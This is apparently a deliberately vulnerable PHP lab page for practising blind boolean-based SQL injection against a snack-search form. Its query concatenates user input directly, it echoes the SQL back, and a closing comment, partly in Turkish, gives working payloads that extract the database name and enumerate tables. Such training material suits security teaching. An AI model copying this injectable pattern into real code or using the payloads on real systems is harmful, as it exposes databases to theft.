<?php

include "includer.php";
$newconn = new ConnectDB($sn,$un,$pss,$db);

function checkInput($data)
{
    switch($_COOKIE['security_level'])
    {
        case "0" :
            $data = no_check($data);
            break;
        case "1" :
            $data = sqli_check_1($data);
            break;
        case "2" :
            $data = sqli_check_1($data);
            break;
        default :
            $data = no_check($data);
            break;
    }
    return $data;
}

?>



<div class="container"> 

    <h1>SQL Injection Blind Boolean Based </h1>

    <form action="<?php echo $_SERVER["SCRIPT_NAME"];?>" method="POST">
        
        <p>
            <label for="name">Search a a snack: </label>
            <input type="text" name="name" id="name" size="30">
            <button type="submit" name="aciton" value="search">Search</button>
        </p>

    </form>



<?php

    if(isset($_REQUEST["name"])){
        $name = $_REQUEST["name"];
        $sql = "SELECT * FROM aburcubur WHERE aa_name='".checkInput($name)."'";
        echo $sql."<br>";
        $result = $newconn->conn->query($sql);
        if(!$result)
            die("<font color=\"red\">Incorrect syntax detected!</font>");
            #die("Error".print_r($newconn->conn->errorInfo()));

        if($result->rowCount() != 0){
            #echo "DATA GELIYOR";
            echo "<font color=\"green\">The snack exists in our stocks</font>";
        }
        else
            echo "<font color=\"orange\">Owww noooo we must add this for the next time</font>";
    }
    $newconn->disconnectServer();

?>


</div>


<!--

Level 0:

' or (substring(database(),1,1))='t'# -database in ilk harfinin t olup olmadığını sorduk
' or (substring(database(),2,1))='e'# -database in ilinci harfinin e olup olmadığını sorduk

kendi kodunla yada burbsuit in intruder ile bruteforce tek tek denersin. database ismini öğrendik

' or substring( (SELECT table_name FROM information_schema.tables WHERE table_schema="test_db" LIMIT 0,1),1,1)='a'#
-artık tabloların column isimlerini bulmak. LIMIT x,y -- x,tablo numarsı

Level 1:
http://musana.net/yazilar/2016/boolean-sql-injection-and-python-exploit-tool.html


-->